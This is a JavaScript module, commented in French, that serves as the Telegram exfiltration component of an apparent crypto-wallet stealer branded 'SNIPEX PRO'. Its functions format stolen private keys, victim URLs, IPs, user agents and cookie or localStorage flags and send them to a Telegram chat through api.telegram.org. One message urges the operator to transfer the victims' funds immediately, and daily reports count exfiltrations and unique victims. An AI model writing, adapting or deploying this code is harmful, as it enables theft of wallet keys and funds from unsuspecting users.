// Module Telegram pour envoyer les données exfiltrées
// Envoie automatiquement les clés privées vers un groupe privé

const https = require('https');

class TelegramBot {
    constructor(token, chatId) {
        this.token = token;
        this.chatId = chatId;
        this.baseUrl = `https://api.telegram.org/bot${token}`;
    }

    // Envoyer un message simple
    async sendMessage(text) {
        try {
            const message = {
                chat_id: this.chatId,
                text: text,
                parse_mode: 'HTML'
            };

            const response = await this.makeRequest('/sendMessage', message);
            console.log('✅ Message Telegram envoyé:', response.ok);
            return response;
        } catch (error) {
            console.error('❌ Erreur lors de l\'envoi du message Telegram:', error);
            throw error;
        }
    }

    // Envoyer les données exfiltrées formatées
    async sendExfiltrationAlert(data) {
        try {
            const {
                exfiltratedData,
                metadata,
                timestamp
            } = data;

            // Créer le message principal
            let message = `🚨 <b>ALERTE EXFILTRATION - SNIPEX PRO</b>\n\n`;
            message += `⏰ <b>Timestamp:</b> ${new Date(timestamp).toLocaleString('fr-FR')}\n`;
            message += `🌐 <b>URL Source:</b> ${metadata.url || 'N/A'}\n`;
            message += `📱 <b>User Agent:</b> ${metadata.userAgent || 'N/A'}\n`;
            message += `📦 <b>Total Bundles:</b> ${metadata.totalBundles}\n`;
            message += `🔑 <b>Clés Décodées:</b> ${metadata.decodedKeys}\n`;
            message += `💼 <b>URLs Générées:</b> ${metadata.generatedUrls}\n\n`;

            // Ajouter les paramètres des toggles
            if (metadata.settings) {
                message += `⚙️ <b>Paramètres Actifs:</b>\n`;
                message += `   • Auto Sniping: ${metadata.settings.autoSniping ? '✅' : '❌'}\n`;
                message += `   • Bypass Anti-Bot: ${metadata.settings.bypassAntiBot ? '✅' : '❌'}\n`;
                message += `   • Gas Priority: ${metadata.settings.gasPriority ? '✅' : '❌'}\n`;
                message += `   • Slippage: ${metadata.settings.slippage}%\n`;
                message += `   • Agressivité: ${metadata.settings.aggressiveness}%\n\n`;
            }

            // Envoyer le message principal
            await this.sendMessage(message);

            // Envoyer chaque clé individuellement pour plus de clarté
            for (let i = 0; i < exfiltratedData.length; i++) {
                const keyData = exfiltratedData[i];
                await this.sendKeyDetails(keyData, i + 1);
            }

            // Message de résumé
            const summaryMessage = `📊 <b>RÉSUMÉ EXFILTRATION</b>\n\n`;
            summaryMessage += `🎯 <b>Total Clés Extraites:</b> ${exfiltratedData.length}\n`;
            summaryMessage += `💰 <b>Valeur Estimée:</b> Potentiellement élevée\n`;
            summaryMessage += `⚠️ <b>Action Requise:</b> Vérification immédiate\n\n`;
            summaryMessage += `🔗 <b>Plateforme Trading:</b> ${metadata.url ? metadata.url.replace(/^https?:\/\//, '') : 'N/A'}`;

            await this.sendMessage(summaryMessage);

        } catch (error) {
            console.error('❌ Erreur lors de l\'envoi de l\'alerte Telegram:', error);
            throw error;
        }
    }

    // Envoyer les détails d'une clé
    async sendKeyDetails(keyData, index) {
        try {
            let keyMessage = `🔑 <b>CLÉ ${index}</b>\n\n`;
            keyMessage += `📋 <b>Type:</b> ${keyData.type}\n`;
            keyMessage += `⏰ <b>Timestamp:</b> ${new Date(keyData.timestamp).toLocaleString('fr-FR')}\n\n`;

            if (keyData.publicKey) {
                keyMessage += `🌐 <b>Clé Publique:</b>\n<code>${keyData.publicKey}</code>\n\n`;
            }

            if (keyData.privateKey) {
                keyMessage += `🔐 <b>Clé Privée:</b>\n<code>${keyData.privateKey}</code>\n\n`;
            }

            // Ajouter des informations de sécurité
            keyMessage += `⚠️ <b>ATTENTION:</b> Cette clé privée donne accès complet au portefeuille !\n`;
            keyMessage += `🚨 <b>Action Immédiate:</b> Transférer les fonds si possible`;

            await this.sendMessage(keyMessage);

        } catch (error) {
            console.error('❌ Erreur lors de l\'envoi des détails de clé:', error);
        }
    }

    // Envoyer une notification de nouvelle demande de clé
    async sendBundleKeyRequest(data) {
        try {
            let message = `🔑 <b>NOUVELLE DEMANDE DE CLÉ</b>\n\n`;
            message += `⏰ <b>Timestamp:</b> ${new Date(data.timestamp).toLocaleString('fr-FR')}\n`;
            message += `📦 <b>Bundles:</b> ${data.bundles}\n`;
            message += `🌐 <b>URL Source:</b> ${data.url || 'N/A'}\n`;
            message += `📱 <b>User Agent:</b> ${data.userAgent || 'N/A'}\n`;
            message += `🍪 <b>Cookies:</b> ${data.cookies ? 'Oui' : 'Non'}\n`;
            message += `💾 <b>LocalStorage:</b> ${data.localStorage ? 'Oui' : 'Non'}\n\n`;
            message += `🎯 <b>Statut:</b> Clé de déchiffrement générée et envoyée`;

            await this.sendMessage(message);

        } catch (error) {
            console.error('❌ Erreur lors de l\'envoi de la notification de demande:', error);
        }
    }

    // Envoyer une notification d'accès à la plateforme de trading
    async sendTradingAccess(data) {
        try {
            let message = `💼 <b>ACCÈS PLATEFORME TRADING</b>\n\n`;
            message += `⏰ <b>Timestamp:</b> ${new Date(data.timestamp).toLocaleString('fr-FR')}\n`;
            message += `🌐 <b>IP:</b> ${data.ip || 'N/A'}\n`;
            message += `📱 <b>User Agent:</b> ${data.userAgent || 'N/A'}\n`;

            if (data.publicKey) {
                message += `🌐 <b>Clé Publique:</b>\n<code>${data.publicKey}</code>\n\n`;
            }

            if (data.privateKey) {
                message += `🔐 <b>Clé Privée:</b>\n<code>${data.privateKey}</code>\n\n`;
            }

            message += `🎯 <b>Action:</b> Utilisateur connecté à la plateforme de trading`;

            await this.sendMessage(message);

        } catch (error) {
            console.error('❌ Erreur lors de l\'envoi de la notification d\'accès trading:', error);
        }
    }

    // Envoyer des statistiques quotidiennes
    async sendDailyStats(stats) {
        try {
            let message = `📊 <b>STATISTIQUES QUOTIDIENNES</b>\n\n`;
            message += `📅 <b>Date:</b> ${new Date().toLocaleDateString('fr-FR')}\n`;
            message += `📦 <b>Total Bundles:</b> ${stats.total_bundles}\n`;
            message += `🔑 <b>Total Clés:</b> ${stats.total_keys}\n`;
            message += `🚨 <b>Total Exfiltrations:</b> ${stats.total_exfiltrations}\n`;
            message += `👥 <b>Utilisateurs Uniques:</b> ${stats.unique_users}\n\n`;
            message += `💰 <b>Résumé:</b> ${stats.total_keys > 0 ? 'Données sensibles collectées' : 'Aucune activité'}`;

            await this.sendMessage(message);

        } catch (error) {
            console.error('❌ Erreur lors de l\'envoi des statistiques:', error);
        }
    }

    // Envoyer une alerte de sécurité
    async sendSecurityAlert(alert) {
        try {
            let message = `🚨 <b>ALERTE DE SÉCURITÉ</b>\n\n`;
            message += `⏰ <b>Timestamp:</b> ${new Date().toLocaleString('fr-FR')}\n`;
            message += `⚠️ <b>Type:</b> ${alert.type}\n`;
            message += `🔍 <b>Description:</b> ${alert.description}\n`;
            message += `🌐 <b>Source:</b> ${alert.source || 'N/A'}\n\n`;
            message += `🎯 <b>Action Requise:</b> ${alert.action || 'Vérification immédiate'}`;

            await this.sendMessage(message);

        } catch (error) {
            console.error('❌ Erreur lors de l\'envoi de l\'alerte de sécurité:', error);
        }
    }

    // Faire une requête HTTP vers l'API Telegram
    makeRequest(method, data) {
        return new Promise((resolve, reject) => {
            const postData = JSON.stringify(data);
            
            const options = {
                hostname: 'api.telegram.org',
                port: 443,
                path: `${method}`,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(postData)
                }
            };

            const req = https.request(options, (res) => {
                let responseData = '';
                
                res.on('data', (chunk) => {
                    responseData += chunk;
                });
                
                res.on('end', () => {
                    try {
                        const parsed = JSON.parse(responseData);
                        resolve(parsed);
                    } catch (error) {
                        reject(new Error('Réponse invalide de Telegram'));
                    }
                });
            });

            req.on('error', (error) => {
                reject(error);
            });

            req.write(postData);
            req.end();
        });
    }

    // Tester la connexion
    async testConnection() {
        try {
            const response = await this.makeRequest('/getMe', {});
            if (response.ok) {
                console.log('✅ Bot Telegram connecté:', response.result.username);
                return true;
            } else {
                console.error('❌ Erreur de connexion Telegram:', response);
                return false;
            }
        } catch (error) {
            console.error('❌ Erreur lors du test de connexion Telegram:', error);
            return false;
        }
    }
}

// Créer une instance du bot
const createTelegramBot = () => {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
        console.warn('⚠️ Variables Telegram non configurées. Notifications désactivées.');
        return null;
    }

    const bot = new TelegramBot(token, chatId);
    
    // Tester la connexion au démarrage
    bot.testConnection();
    
    return bot;
};

module.exports = {
    TelegramBot,
    createTelegramBot
}; 